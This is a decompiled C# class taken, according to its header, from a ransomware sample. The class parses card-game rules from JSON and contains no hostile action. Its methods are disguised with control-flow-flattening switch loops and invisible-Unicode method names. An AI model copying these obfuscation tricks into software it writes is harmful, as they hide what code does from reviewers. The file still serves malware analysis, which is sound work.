// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Rules
// Assembly: PInvokeAttribut, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: D5FBD274-2C02-4186-9C35-1EE6A67C7338
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-1aab9260ecb3ef6b3d07882eff498982f5146fb73a61ff77f8ea0dfbfb02cde7.exe

using SimpleJSON;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Rules
  {
    public int SprintCount { get; private set; }

    public int MaxImpact { get; private set; }

    public Card[] Cards { get; private set; }

    public int InitialResources { get; private set; }

    public int NormalPlanningCount { get; private set; }

    public int NormalPlanningCost { get; private set; }

    public int OverPlanningCost { get; private set; }

    public int SprintsWonWithoutPlanning { get; private set; }

    public float[] RiskChances { get; private set; }

    public bool EconomicsAffectsAll { get; private set; }

    public int StayOnSprintMinDiff { get; private set; }

    public bool OnlyOneWinner { get; private set; }

    private Rules()
    {
    }

    public static Rules Deserialize(JSONNode json)
    {
label_1:
      int num1 = -1363125415;
      Rules rules;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1589175956)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            int asInt = json["max-impact"].AsInt;
            rules = new Rules()
            {
              SprintCount = json["sprints"].AsInt,
              MaxImpact = asInt,
              Cards = Rules.ParseDeck(json["deck"], asInt),
              InitialResources = json["initial-resources"].AsInt,
              NormalPlanningCount = json["normal-planning-count"].AsInt,
              NormalPlanningCost = json["normal-planning-cost"].AsInt,
              OverPlanningCost = json["over-planning-cost"].AsInt,
              SprintsWonWithoutPlanning = json["sprints-won-without-planning"].AsInt,
              RiskChances = Rules.ParseRiskChances(json["risk-chances"]),
              EconomicsAffectsAll = json["economics-affects-all"].AsBool,
              StayOnSprintMinDiff = json["stay-on-sprint-min-diff"].AsInt,
              OnlyOneWinner = json["only-one-winner"].AsBool
            };
            num1 = (int) num2 * 1240453246 ^ -1954166900;
            continue;
          case 2:
            num1 = (int) num2 * 1620692638 ^ 1070812339;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return rules;
    }

    private static float[] ParseRiskChances(JSONNode json)
    {
      float[] numArray = new float[json.Count];
label_1:
      int num1 = 1475933517;
      int aIndex;
      float[] riskChances;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 598056398)) % 8U)
        {
          case 0:
            num1 = (int) num2 * 445425530 ^ 1298237263;
            continue;
          case 2:
            goto label_1;
          case 3:
            aIndex = 0;
            num1 = (int) num2 * 1866164836 ^ 1399444444;
            continue;
          case 4:
            int num3;
            num1 = num3 = aIndex < numArray.Length ? 1564901459 : (num3 = 583496513);
            continue;
          case 5:
            numArray[aIndex] = json[aIndex].AsFloat;
            ++aIndex;
            num1 = 1969249282;
            continue;
          case 6:
            num1 = (int) num2 * 2084658311 ^ -1210917456;
            continue;
          case 7:
            riskChances = numArray;
            num1 = (int) num2 * -1374305907 ^ 87503021;
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      return riskChances;
    }

    private static Card[] ParseDeck(JSONNode json, int maxImpact)
    {
label_1:
      int num1 = 273675689;
      List<Card> cardList;
      bool flag1;
      int aIndex1;
      int aIndex2;
      int count;
      bool flag2;
      JSONNode jsonNode;
      Card[] array;
      int num2;
      bool flag3;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ 981573334)) % 25U)
        {
          case 0:
            ++num2;
            num1 = (int) num3 * -1871850955 ^ -1050896541;
            continue;
          case 1:
            jsonNode = json[aIndex2];
            num1 = 1871683404;
            continue;
          case 2:
            num1 = (int) num3 * -491765695 ^ -1479966921;
            continue;
          case 3:
            num1 = (int) num3 * 279244633 ^ 158069361;
            continue;
          case 4:
            int num4 = flag2 ? 1170163 : (num4 = 2075387696);
            num1 = num4 ^ (int) num3 * 1925035073;
            continue;
          case 5:
            int num5;
            num1 = num5 = aIndex1 < maxImpact * 2 ? 359455003 : (num5 = 1328183222);
            continue;
          case 6:
            flag1 = aIndex1 < maxImpact;
            num1 = 859667671;
            continue;
          case 7:
            count = json.Count;
            num1 = (int) num3 * -613444487 ^ -832964581;
            continue;
          case 8:
            flag3 = aIndex2 < count;
            num1 = 90686653;
            continue;
          case 9:
            cardList = new List<Card>();
            num1 = (int) num3 * 404027999 ^ 884286261;
            continue;
          case 10:
            int num6 = !flag3 ? 12967080 : (num6 = 16627525);
            num1 = num6 ^ (int) num3 * 921721303;
            continue;
          case 11:
            array = cardList.ToArray();
            num1 = (int) num3 * -936824949 ^ -1544174357;
            continue;
          case 12:
            num1 = (int) num3 * -1100217000 ^ -2046360009;
            continue;
          case 13:
            aIndex2 = 0;
            num1 = (int) num3 * -1033610371 ^ 2081256766;
            continue;
          case 14:
            flag2 = num2 < jsonNode[aIndex1].AsInt;
            num1 = 702165454;
            continue;
          case 15:
            num2 = 0;
            num1 = 1032605391;
            continue;
          case 17:
            num1 = (int) num3 * 724287536 ^ 945611452;
            continue;
          case 18:
            goto label_1;
          case 19:
            cardList.Add(new Card()
            {
              Impact = flag1 ? -(maxImpact - aIndex1) : maxImpact * 2 - aIndex1,
              Type = aIndex2
            });
            num1 = 185784303;
            continue;
          case 20:
            ++aIndex2;
            num1 = (int) num3 * -726719008 ^ -1812571393;
            continue;
          case 21:
            num1 = (int) num3 * 1580452265 ^ -1034835615;
            continue;
          case 22:
            num1 = (int) num3 * 1407186896 ^ -30453382;
            continue;
          case 23:
            ++aIndex1;
            num1 = (int) num3 * -1993226299 ^ -1031864778;
            continue;
          case 24:
            aIndex1 = 0;
            num1 = (int) num3 * -538208 ^ 1599656964;
            continue;
          default:
            goto label_26;
        }
      }
label_26:
      return array;
    }

    public override string ToString() => Rules.\u206C‮⁪‮​⁫‏‪‪⁭⁯⁬⁫‭‌‫⁬⁯‎‫​‫‫⁬‌‫​⁭‭‌‭⁫‬‏‫‫‌⁬‭‎‮("sprints: {0},\nmax-impact:{1},\ndeck: \n{2},\n\ninitial-resources: {3},\n\nnormal-planning-count: {4},\nnormal-planning-cost: {5},\nover-planning-cost: {6},\nsprints-won-without-planning: {7},\n\nrisk-chances: {8},\n\neconomics-affects-all: {9},\nstay-on-sprint-min-diff: {10},\nonly-one-winner: {11}", new object[12]
    {
      (object) this.SprintCount,
      (object) this.MaxImpact,
      (object) this.CardsToString(),
      (object) this.InitialResources,
      (object) this.NormalPlanningCount,
      (object) this.NormalPlanningCost,
      (object) this.OverPlanningCost,
      (object) this.SprintsWonWithoutPlanning,
      (object) this.RiskChancesToString(),
      (object) this.EconomicsAffectsAll,
      (object) this.StayOnSprintMinDiff,
      (object) this.OnlyOneWinner
    });

    private string CardsToString()
    {
label_1:
      int num1 = 1777531790;
      int num2;
      int index;
      Card[] cards;
      Card card1;
      bool flag;
      string str1;
      string str2;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ 452953085)) % 16U)
        {
          case 0:
            int num4 = flag ? -327220618 : (num4 = -381960604);
            num1 = num4 ^ (int) num3 * -2015760947;
            continue;
          case 1:
            cards = this.Cards;
            index = 0;
            num1 = (int) num3 * -627800496 ^ 1642383891;
            continue;
          case 2:
            str2 = Rules.\u206B‌‫‏‪‬‮​⁪‌‮⁭‬⁫‬‏⁬​‍⁭⁪‌⁬‪‌‌⁯‎⁯​⁫‮‌‌⁯‌‍⁮‌‍‮(str1, "\n]");
            num1 = (int) num3 * -253479793 ^ -530130338;
            continue;
          case 3:
            str1 = "[\n\t";
            num1 = (int) num3 * 1718109196 ^ -940818347;
            continue;
          case 4:
            num1 = (int) num3 * -382149338 ^ -1957677964;
            continue;
          case 5:
            num1 = (int) num3 * 1891699666 ^ 183766318;
            continue;
          case 6:
            flag = num2 != card1.Type;
            num1 = (int) num3 * 874658184 ^ 1793889885;
            continue;
          case 7:
            card1 = cards[index];
            num1 = 1608063339;
            continue;
          case 8:
            goto label_1;
          case 9:
            string str3 = str1;
            Card card2 = card1;
            string str4 = card2 != null ? Rules.\u200C⁯‌‫⁮‏‬⁭‮⁬‪‎⁬⁮⁭⁮‫⁭‫‭‏⁮‪⁭‭​​‍⁬⁪⁫⁬‮‭‮⁭‍⁪⁬‎‮((object) card2) : (string) null;
            str1 = Rules.\u200F⁮⁪‎⁭⁮‏‮⁭‏‫‪‭‎⁫⁫⁭‭‫‫‫⁬‏⁯‮‍‍‬‏‮⁮‪‌⁮‮‫‮⁮‮⁮‮(str3, str4, " ");
            ++index;
            num1 = 1544965751;
            continue;
          case 10:
            int num5;
            num1 = num5 = index < cards.Length ? 528247130 : (num5 = 245103295);
            continue;
          case 11:
            str1 = Rules.\u206B‌‫‏‪‬‮​⁪‌‮⁭‬⁫‬‏⁬​‍⁭⁪‌⁬‪‌‌⁯‎⁯​⁫‮‌‌⁯‌‍⁮‌‍‮(str1, "\n\t");
            num1 = (int) num3 * -2008125138 ^ 664293560;
            continue;
          case 12:
            num2 = 0;
            num1 = (int) num3 * 121385526 ^ 829934865;
            continue;
          case 14:
            num1 = (int) num3 * 2139367763 ^ 1594467309;
            continue;
          case 15:
            num2 = card1.Type;
            num1 = (int) num3 * 2124321555 ^ 1224806133;
            continue;
          default:
            goto label_17;
        }
      }
label_17:
      return str2;
    }

    private string RiskChancesToString()
    {
      string str1 = Rules.\u206B‌‫‏‪‬‮​⁪‌‮⁭‬⁫‬‏⁬​‍⁭⁪‌⁬‪‌‌⁯‎⁯​⁫‮‌‌⁯‌‍⁮‌‍‮("[ ", this.RiskChances[0].ToString((IFormatProvider) Rules.\u200D⁪⁭⁪‎⁬‪​‫‌‪‫⁬⁯⁬‌‭‍‫‎‪‫‫⁯⁮‎⁫⁮‌‫⁬​‪⁭‎⁫⁫⁬​‬‮()));
      int index = 1;
label_6:
      int num1 = index < this.RiskChances.Length ? -896199886 : (num1 = -2008371202);
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1238778981)) % 6U)
        {
          case 0:
            ++index;
            num1 = (int) num2 * -192603469 ^ -1403551084;
            continue;
          case 1:
            str1 = Rules.\u200F⁮⁪‎⁭⁮‏‮⁭‏‫‪‭‎⁫⁫⁭‭‫‫‫⁬‏⁯‮‍‍‬‏‮⁮‪‌⁮‮‫‮⁮‮⁮‮(str1, ", ", this.RiskChances[index].ToString((IFormatProvider) Rules.\u200D⁪⁭⁪‎⁬‪​‫‌‪‫⁬⁯⁬‌‭‍‫‎‪‫‫⁯⁮‎⁫⁮‌‫⁬​‪⁭‎⁫⁫⁬​‬‮()));
            num1 = -1583835447;
            continue;
          case 2:
            num1 = -896199886;
            continue;
          case 3:
            str2 = Rules.\u206B‌‫‏‪‬‮​⁪‌‮⁭‬⁫‬‏⁬​‍⁭⁪‌⁬‪‌‌⁯‎⁯​⁫‮‌‌⁯‌‍⁮‌‍‮(str1, " ]");
            num1 = (int) num2 * -308379603 ^ 1915905586;
            continue;
          case 5:
            goto label_6;
          default:
            goto label_7;
        }
      }
label_7:
      return str2;
    }

    static string \u206C‮⁪‮​⁫‏‪‪⁭⁯⁬⁫‭‌‫⁬⁯‎‫​‫‫⁬‌‫​⁭‭‌‭⁫‬‏‫‫‌⁬‭‎‮([In] string obj0, [In] object[] obj1) => string.Format(obj0, obj1);

    static string \u206B‌‫‏‪‬‮​⁪‌‮⁭‬⁫‬‏⁬​‍⁭⁪‌⁬‪‌‌⁯‎⁯​⁫‮‌‌⁯‌‍⁮‌‍‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static string \u200C⁯‌‫⁮‏‬⁭‮⁬‪‎⁬⁮⁭⁮‫⁭‫‭‏⁮‪⁭‭​​‍⁬⁪⁫⁬‮‭‮⁭‍⁪⁬‎‮([In] object obj0) => obj0.ToString();

    static string \u200F⁮⁪‎⁭⁮‏‮⁭‏‫‪‭‎⁫⁫⁭‭‫‫‫⁬‏⁯‮‍‍‬‏‮⁮‪‌⁮‮‫‮⁮‮⁮‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }

    static CultureInfo \u200D⁪⁭⁪‎⁬‪​‫‌‪‫⁬⁯⁬‌‭‍‫‎‪‫‫⁯⁮‎⁫⁮‌‫⁬​‪⁭‎⁫⁫⁬​‬‮() => CultureInfo.InvariantCulture;
  }
}
